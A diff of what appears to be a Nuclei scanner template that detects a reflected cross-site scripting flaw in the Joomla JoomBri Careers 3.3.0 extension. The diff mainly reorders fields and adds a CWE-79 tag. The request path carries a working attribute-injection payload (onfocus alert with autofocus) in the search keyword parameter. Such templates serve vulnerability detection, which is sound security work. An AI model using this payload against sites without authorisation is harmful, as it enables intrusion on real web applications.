@@ -1,5 +1,4 @@
 id: joomla-joombri-careers-xss
-
 info:
   name: Joomla JoomBri Careers 3.3.0 - Cross-Site Scripting
   author: r3Y3r53
@@ -10,21 +9,21 @@ info:
     - https://packetstormsecurity.com/files/168641/Joomla-JoomBri-Careers-3.3.0-Cross-Site-Scripting.html
     - https://cxsecurity.com/issue/WLB-2022100024
     - https://extensions.joomla.org/
+  classification:
+    cwe-id:
+      - CWE-79
   metadata:
-    verified: true
     max-request: 1
-  tags: packetstorm,xss,joomla,joombri,vuln
-
+    verified: true
+  tags: joombri,joomla,packetstorm,vuln,xss
 http:
-  - method: GET
-    path:
-      - "{{BaseURL}}/for-jobseekers/search-jobs?keyword=l9x1q%22onfocus%3D%22alert(document.domain)%22autofocus%3D%22ak5aghi5u9p"
-
-    matchers:
-      - type: dsl
+  - matchers:
+      - condition: and
         dsl:
-          - 'contains(body, "alert(document.domain)") && contains(body, "Joomla") && contains(tolower(body), "joombri")'
-          - 'contains(content_type, "text/html")'
-          - 'status_code == 200'
-        condition: and
-
+          - contains(body, "alert(document.domain)") && contains(body, "Joomla") && contains(tolower(body), "joombri")
+          - contains(content_type, "text/html")
+          - status_code == 200
+        type: dsl
+    method: GET
+    path:
+      - '{{BaseURL}}/for-jobseekers/search-jobs?keyword=l9x1q%22onfocus%3D%22alert(document.domain)%22autofocus%3D%22ak5aghi5u9p'
